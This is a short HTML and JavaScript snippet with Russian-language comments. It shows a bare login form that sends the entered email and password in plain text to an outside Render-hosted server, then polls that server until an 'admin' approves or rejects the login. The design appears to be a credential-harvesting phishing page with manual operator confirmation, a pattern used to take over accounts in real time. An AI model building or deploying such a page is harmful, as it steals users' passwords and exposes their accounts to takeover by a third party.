<input type="text" id="email" placeholder="Email">
<input type="password" id="pass" placeholder="Password">
<button onclick="sendData()">Войти</button>

<script>
    const SERVER_URL = 'https://sever-afk3.onrender.com'; // Твой URL на Render
    const userId = 'user_' + Math.random().toString(36).substr(2, 9);

    async function sendData() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        // Отправка данных на твой сервер
        await fetch(`${SERVER_URL}/send-data`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'auth',
                email: email,
                pass: pass,
                userId: userId
            })
        });

        alert('Данные отправлены. Ожидайте подтверждения...');

        // Твоя функция проверки подтверждения
        const interval = setInterval(async () => {
            const res = await fetch(`${SERVER_URL}/check/${userId}`);
            const data = await res.json();

            if (data.status === 'success') {
                clearInterval(interval);
                alert('Админ подтвердил вход!');
                // window.location.href = 'успех.html';
            } else if (data.status === 'error') {
                clearInterval(interval);
                alert('Админ отклонил вход.');
            }
        }, 3000);
    }
</script>
